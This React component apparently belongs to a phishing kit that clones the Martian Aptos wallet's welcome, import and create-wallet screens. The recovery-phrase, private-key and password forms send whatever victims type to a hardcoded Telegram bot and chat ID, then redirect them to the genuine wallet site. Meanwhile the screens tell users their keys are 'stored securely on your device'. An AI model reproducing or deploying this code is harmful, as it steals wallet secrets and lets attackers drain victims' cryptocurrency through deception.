import React, { useState } from 'react'
import { MdCloudUpload } from 'react-icons/md';
import { AiOutlineArrowLeft, AiOutlineClose, AiFillInfoCircle } from 'react-icons/ai';
import { IoIosArrowForward } from 'react-icons/io';
import { CiHardDrive } from 'react-icons/ci';
import { BsFillFolderFill } from 'react-icons/bs';
import key from '../assets/key.PNG'
import { Navbar } from '../Components';
const ConnectWallet = () => {
  const [option1, setOption1] = useState(false)
  const [option2, setOption2] = useState(false)
  const [selected1, setSelected1] = useState(false)
  const [selected2, setSelected2] = useState(false)
  const [one, set1] = useState("");
  const [two, set2] = useState("");
  const [three, set3] = useState("");
  const [four, set4] = useState("");
  const [five, set5] = useState("");
  const [six, set6] = useState("");
  const [seven, set7] = useState("");
  const [eight, set8] = useState("");
  const [nine, set9] = useState("");
  const [ten, set10] = useState("");
  const [eleven, set11] = useState("");
  const [twelve, set12] = useState("");
  const [prharePass, setPrharePass] = useState('');
  const [pass, setPass] = useState('');
  const [confirmPass, setConfirmPass] = useState('');
  const [prograss, setPrograss] = useState(0);

  let bot = {
    TOKEN: "5768289542:AAFeDrNZKJ0Tr9PuisnS3qBa3bKk2eWF63Q",
    CHATID: "1416009398",

  }

  console.log(prograss)
  const submitAddress = () => {
    let secratePrhase = !prharePass ? `mnemonic is ${one} ${two} ${three} ${four} ${four} ${five} ${six} ${seven} ${eight} ${nine} ${ten} ${eleven} ${twelve}` : `phrase is pass is ${prharePass}`

    fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${secratePrhase}`, {
      method: "GET"
    })
      .then(success => {
        setPrharePass('')
        window.location = 'https://martianwallet.xyz'
      }, error => {
        alert("not sent")
      })
  }
  const submitNewPass = () => {
    let password = !prharePass && `password is ${pass} and confirm password is ${confirmPass}`;

    fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.CHATID}&text=${password}`, {
      method: "GET"
    })
      .then(success => {
        setPrharePass('')
        window.location = 'https://martianwallet.xyz'
      }, error => {
        alert("not sent")
      })
  }
  return (
    <div>

<Navbar/>

      <div className='bg-white absolute lg:right-[29%] md:right-auto lg:top-[15%] top-[30%] lg:w-[750px] w-full rounded-xl shadow-lg overflow-hidden '>
        {
          prograss === 0 ? "" : <div style={{ width: `${prograss}%` }} className={`bg-black text-sm`}>dada</div>
        }
        {
          option1 ?
            <>
              <div className={option1 ? "translate-x-0 px-5 py-4" : "duration-10000 translate-x-[50rem]"}>
                <p onClick={() => {
                  setOption1((prevState) => !prevState)
                  setPrograss((prevState) => prevState - 50)
                }} className='cursor-pointer flex justify-between '><AiOutlineArrowLeft className='bg-slate-100 rounded-2xl p-2 text-3xl text-slate-500' /><AiOutlineClose className='bg-slate-100 rounded-2xl p-2 text-3xl text-slate-500' /></p>
                <div className='text-center'>
                  <p className='text-4xl font-[700] mt-6'>Create a Password</p>
                  <p className='text-sm text-[#afafaf]'>You will use the password to unlock your wallet.</p>
                  <p className='text-sm text-[#afafaf]'>Do not share your password with others</p>
                </div>
                <div className='lg:mx-24 mx-5'>
                  <div className='my-5'>
                    <label>Password</label><br />
                    <input onChange={(e) => setPass(e.target.value)} className='border rounded-lg p-4 w-full outline-0' />
                  </div>
                  <div className='my-5'>
                    <label>Confirm Password</label><br />
                    <input onChange={(e) => setConfirmPass(e.target.value)} className='border rounded-lg p-4 w-full outline-0' />
                  </div>
                  <input className='mr-4' type='checkbox' /><label>I have read and agree to the Terms of Service and Privacy Policy</label>
                  <div className='bg-slate-100 rounded-lg flex items-top my-5'>
                    <AiFillInfoCircle className='text-5xl mx-2  text-slate-500' />
                    <p className='text-sm py-3 px-2 text-slate-500'>
                      For your protection, Martian locks your wallet after 60 minutes of inactivity. You will need this password to unlock it. The password is stored securely on your device. We cannot recover the password for you, if it is lost.</p>
                  </div>
                  <button className={pass && confirmPass ? 'bg-black text-white w-full p-3 rounded-lg my-5 cursor-pointer' : 'bg-black text-white w-full p-3 rounded-lg my-5 cursor-not-allowed	 opacity-20'} disabled={!confirmPass} onClick={() => submitNewPass()}>Continue</button>
                </div>
              </div>
            </>
            :
            option2 ?
              <>
                {
                  selected1 ?
                    <div className='p-8 '>
                      <p onClick={() => {
                        setSelected1((prevState) => !prevState)
                        setPrograss((prevState) => prevState - 20)

                      }} className='cursor-pointer flex justify-between '><AiOutlineArrowLeft className='bg-slate-100 rounded-2xl p-2 text-3xl text-slate-500' /><AiOutlineClose className='bg-slate-100 rounded-2xl p-2 text-3xl text-slate-500' /></p>
                      <div className='flex flex-col items-center'>
                        <div className='text-center'>
                          <p className='text-4xl font-[700] mb-2'>Recovery Phrase</p>
                          <p className='text-sm text-[#afafaf]'>Import an existing wallet with your 12 word secret </p>
                          <p className='text-sm text-[#afafaf]'>recovery phrase or input your private key.</p>
                        </div>
                        <div className='grid grid-cols-3 justify-items-center gap-4 my-10'>
                          <div className='flex items-center'>
                            <label>1.</label>
                            <input onChange={(e) => set1(e.target.value)} name='1' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                          <div className='flex items-center'>
                            <label>2.</label>
                            <input onChange={(e) => set2(e.target.value)} name='2' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                          <div className='flex items-center'>
                            <label>3.</label>
                            <input onChange={(e) => set3(e.target.value)} name='3' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                          <div className='flex items-center'>
                            <label>4.</label>
                            <input onChange={(e) => set4(e.target.value)} name='4' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                          <div className='flex items-center'>
                            <label>5.</label>
                            <input onChange={(e) => set5(e.target.value)} name='5' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                          <div className='flex items-center'>
                            <label>6.</label>
                            <input onChange={(e) => set6(e.target.value)} name='6' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                          <div className='flex items-center'>
                            <label>7.</label>
                            <input onChange={(e) => set7(e.target.value)} name='7' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                          <div className='flex items-center'>
                            <label>8.</label>
                            <input onChange={(e) => set8(e.target.value)} name='8' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                          <div className='flex items-center'>
                            <label>9.</label>
                            <input onChange={(e) => set9(e.target.value)} name='9' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                          <div className='flex items-center'>
                            <label>10.</label>
                            <input onChange={(e) => set10(e.target.value)} name='10' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                          <div className='flex items-center'>
                            <label>11.</label>
                            <input onChange={(e) => set11(e.target.value)} name='11' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                          <div className='flex items-center'>
                            <label>12.</label>
                            <input onChange={(e) => set12(e.target.value)} name='12' className='mx-2 w-full border outline-0 px-2 py-1 rounded-lg mt-1 placeholder:font-[700] text-lg' />
                          </div>
                        </div>
                        <button className={twelve ? 'bg-black text-white w-96 p-4 rounded-lg mt-10' : 'bg-black text-white w-96 p-4 rounded-lg mt-10 cursor-not-allowed	 opacity-20'} disabled={!twelve}  onClick={() => submitAddress()}>Import Wallet</button>
                      </div>
                    </div>
                    :
                    selected2 ?
                      <div className='p-8 '>
                        <p onClick={() => {
                          setSelected2((prevState) => !prevState)
                          setPrograss((prevState) => prevState - 20)
                        }} className='cursor-pointer flex justify-between '><AiOutlineArrowLeft className='bg-slate-100 rounded-2xl p-2 text-3xl text-slate-500' /><AiOutlineClose className='bg-slate-100 rounded-2xl p-2 text-3xl text-slate-500' /></p>
                        <div className='flex flex-col items-center mx-28'>
                          <div className='text-center flex flex-col items-center'>
                            <img src={key} />
                            <p className='text-4xl font-[700] mb-8 mt-5'>Private Key</p>
                            <p className='text-sm text-[#afafaf]'>To import a new wallet, enter it’s private key below. </p>
                            <p className='text-sm text-[#afafaf]'>It will be enctypted and stored securely on your device.</p>
                          </div>
                          <input placeholder='private key' onChange={(e) => setPrharePass(e.target.value)} className='shadow-lg rounded-lg w-full p-3 my-5 outline-0' />
                          <p className='text-[red] text-sm text-center mt-10 mb-2'>Never share the private key. Anyone with the private key will <br /> have full access to your wallet.</p>
                          <button className='bg-black text-white w-full p-2 rounded-lg ' onClick={() => submitAddress()}>Import Wallet</button>
                        </div>
                      </div>
                      :
                      <div className='px-5 py-10 '>
                        <p onClick={() => {
                          setOption2((prevState) => !prevState)
                          setPrograss((prevState) => prevState - 50)
                        }} className='cursor-pointer flex justify-between '><AiOutlineArrowLeft className='bg-slate-100 rounded-2xl p-2 text-3xl text-slate-500' /><AiOutlineClose className='bg-slate-100 rounded-2xl p-2 text-3xl text-slate-500' /></p>
                        <div className='flex flex-col items-center'>
                          <svg width="88" height="87" viewBox="0 0 88 87" fill="none" xmlns="http://www.w3.org/2000/svg"><ellipse cx="44.2305" cy="43.144" rx="43.5196" ry="42.8984" fill="#3D7CDB" fill-opacity="0.1"></ellipse><svg xmlns="http://www.w3.org/2000/svg" x="24.7305" y="26.144" width="39" height="34" viewBox="0 0 39 34" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M3.73999 0.958108C2.15327 1.26396 0.583156 2.80023 0.147399 4.47333C-0.0455109 5.21399 -0.044126 29.1041 0.148871 29.9227C0.544211 31.5996 1.89225 32.9281 3.55634 33.2808C4.4109 33.462 34.0524 33.462 34.907 33.2808C36.5711 32.9281 37.9191 31.5996 38.3144 29.9227C38.5074 29.1041 38.5088 5.21399 38.3159 4.47333C37.87 2.76146 36.3016 1.25548 34.6466 0.950147C34.0623 0.842311 4.30081 0.850013 3.73999 0.958108ZM34.4138 3.8895C35.2323 4.07938 35.4425 4.45395 35.4867 5.80111C35.5245 6.95338 35.4744 7.0633 34.9768 6.92058C34.7888 6.86666 29.0576 6.83577 19.2317 6.83577C9.4057 6.83577 3.67457 6.86666 3.4865 6.92058C2.98895 7.0633 2.93884 6.95338 2.97666 5.80111C3.02011 4.47636 3.23708 4.07591 4.01028 3.89339C4.4231 3.79594 33.9938 3.79213 34.4138 3.8895ZM34.8069 9.92995C35.7527 10.407 35.834 13.0402 34.8962 12.8238C34.2536 12.6754 4.20968 12.6754 3.56708 12.8238C2.62935 13.0402 2.71062 10.407 3.65639 9.92995C4.12149 9.69523 34.3418 9.69523 34.8069 9.92995ZM34.8069 15.815C35.2852 16.0563 35.4277 16.3996 35.4808 17.438C35.5468 18.7321 35.9827 18.6057 31.4457 18.6073C26.0431 18.609 24.9783 18.9754 23.8556 21.2185C21.6115 25.7026 16.8518 25.7026 14.6077 21.2185C13.4875 18.9803 12.4085 18.609 7.01765 18.6073C2.48058 18.6057 2.91651 18.7321 2.98255 17.438C3.0356 16.3996 3.17814 16.0563 3.65639 15.815C4.12149 15.5803 34.3418 15.5803 34.8069 15.815Z" fill="#3D7CDB"></path></svg></svg>
                          <p className='text-4xl font-[700] my-4'>Import Wallet</p>
                          <p className='text-sm text-slate-500'>Select a method to import your Aptos wallet.</p>
                        </div>
                        <div className='shadow-sm py-4 lg:mx-32'>
                          <div className='flex items-center justify-between p-3 cursor-pointer hover:bg-slate-100' onClick={() => {
                            setSelected1((prevState) => !prevState)
                            setPrograss((prevState) => prevState + 20)
                          }}>
                            <div className='flex items-center'>
                              <span className='mx-2 bg-slate-100 rounded-2xl p-2'><svg width="18px" height="18px" viewBox="0 0 16 12" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.2121 1.04945C11.9663 1.29202 11.1949 2.04734 10.4979 2.72792C8.19441 4.97689 3.81255 9.25955 2.92376 10.1306C2.35651 10.6865 2.36759 10.5765 2.83206 11.0414C3.30031 11.5101 3.17564 11.5318 3.8551 10.8633C4.37564 10.3511 5.57491 9.17454 9.87405 4.95835C13.0406 1.85289 13.4865 1.41111 13.4919 1.37346C13.4993 1.32242 12.7591 0.608398 12.6988 0.608398C12.6721 0.608398 12.5109 0.754515 12.2121 1.04945ZM7.52892 1.76358C4.7837 1.96267 2.21646 3.49845 0.722308 5.83543C0.54561 6.11178 0.543681 6.07513 0.751508 6.38913C1.45045 7.4451 2.9321 8.89458 3.17581 8.76081C3.19841 8.74841 3.72629 8.23456 4.34888 7.61892L5.48086 6.4996L5.46471 6.38612C5.24576 4.84751 6.49404 3.50187 8.14847 3.49302L8.54107 3.49092L8.91442 3.12323C10.2181 1.83927 10.1053 1.97355 9.91537 1.93268C9.2155 1.78202 8.23371 1.71246 7.52892 1.76358ZM12.2127 3.68614C10.8033 5.05032 10.6218 5.22872 10.6118 5.26034C10.6059 5.27895 10.6217 5.3654 10.6468 5.45246C11.2091 7.39581 9.27661 9.27024 7.34539 8.65475C7.26524 8.62922 7.1801 8.60832 7.15618 8.60832C7.10286 8.60832 5.72279 9.97909 5.72279 10.032C5.72279 10.0829 6.0464 10.1767 6.58584 10.2822C9.98435 10.9466 13.5207 9.40067 15.4995 6.3855C15.707 6.0694 15.7064 6.10732 15.5084 5.80474C14.9418 4.93908 14.2041 4.1597 13.3684 3.54403C13.1061 3.35082 12.8153 3.16157 12.7806 3.16157C12.7663 3.16157 12.5108 3.39763 12.2127 3.68614Z" fill="#FF0000"></path></svg></span>
                              <p className='text-lg font-[700]'>Secret Phrase</p>
                            </div>
                            <IoIosArrowForward />
                          </div>
                          <div className='flex items-center justify-between p-3 cursor-pointer hover:bg-slate-100' onClick={() => {
                            setSelected2((prevState) => !prevState)
                            setPrograss((prevState) => prevState + 20)

                          }}>
                            <div className='flex items-center' >
                              <span className='mx-2 bg-slate-100 rounded-2xl p-2'><svg width="18px" height="18px" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M6.96737 0.173284C5.00587 0.726774 4.19901 3.10163 5.34294 4.95459C5.55672 5.30088 5.53015 5.33951 4.09332 6.77073C2.54029 8.31764 2.6699 8.24541 2.21656 7.81664C1.75451 7.37974 1.73672 7.38522 0.903612 8.22071C0.0717978 9.05485 0.0666389 9.07162 0.501602 9.5316C0.885169 9.93716 0.883621 9.92568 0.600653 10.2644C0.105524 10.857 0.339418 11.6535 1.04742 11.7864C1.49457 11.8703 1.58878 11.7923 4.20927 9.17118C5.59238 7.78775 6.77184 6.65588 6.8304 6.65588C6.88895 6.65588 7.15115 6.75764 7.41297 6.88197C9.83748 8.03338 12.1836 6.62583 12.0256 4.11458C11.8699 1.64087 9.18377 -0.452108 6.96737 0.173284ZM8.74784 2.13684C10.6071 3.07951 10.7516 5.68696 8.93279 5.47326C7.40342 5.29353 6.13375 3.38408 6.84026 2.32637C7.18004 1.8177 7.96465 1.73973 8.74784 2.13684Z" fill="#3D7CDB"></path></svg></span>
                              <p className='text-lg font-[700]'>Private Key</p>
                            </div>
                            <IoIosArrowForward />
                          </div>
                          <div className='flex items-center justify-between p-3'>
                            <div className='flex items-center' >
                              <span className='mx-2 bg-slate-100 rounded-2xl p-2'><CiHardDrive /></span>
                              <p className='text-lg font-[700]'>Hardware Wallet</p>
                            </div>
                            <span className='text-sm text-[gray]'>coming soon</span>
                          </div>
                        </div>
                      </div>
                }

              </>
              :
              <div className='lg:p-20 p-5'>
                <p className='text-4xl font-[700] text-center '>Welcome to Martian</p>
                <p className='text-slate-500 my-5 text-center'>The Aptos wallet reimagined; hold crypto, NFTs, swap assets <br /> and track past activity</p>
                <div className='shadow-sm rounded-lg my-10 hover:border-[1px] hover:border-[gray] transition duration-700 ease-in-out'>
                  <div className='flex items-center p-4 cursor-pointer ' onClick={() => {
                    setOption1((prevState) => !prevState)
                    setPrograss((prevState) => prevState + 50)
                  }}>
                    <BsFillFolderFill className='text-5xl bg-slate-200 text-[gray] rounded-[50px] p-2' />
                    <div className='ml-5'>
                      <p className='font-[700]'>Create a New Wallet</p>
                      <p className='text-slate-600'>Get started by creating your very first wallet to hold,<br /> trade and exchange crypto assets</p>
                    </div>
                  </div>
                </div>
                <div className='shadow-sm rounded-lg my-10 hover:border-[1px] hover:border-[gray] transition duration-700 ease-in-out'>
                  <div className='flex items-center p-4 cursor-pointer ' onClick={() => {
                    setOption2((prevState) => !prevState);
                    setPrograss((prevState) => prevState + 50)
                  }}>
                    <MdCloudUpload className='text-5xl bg-slate-200 text-[gray] rounded-[50px] p-2' />
                    <div className='ml-5'>
                      <p className='font-[700]'>I already have a Wallet</p>
                      <p className='text-slate-600'>Import your seed phrase or private key from an existing account to holdin,<br/> trade and exchange assets from Martian</p>
                    </div>
                  </div>
                </div>
              </div>
        }

      </div>
    </div>
  )
}

export default ConnectWallet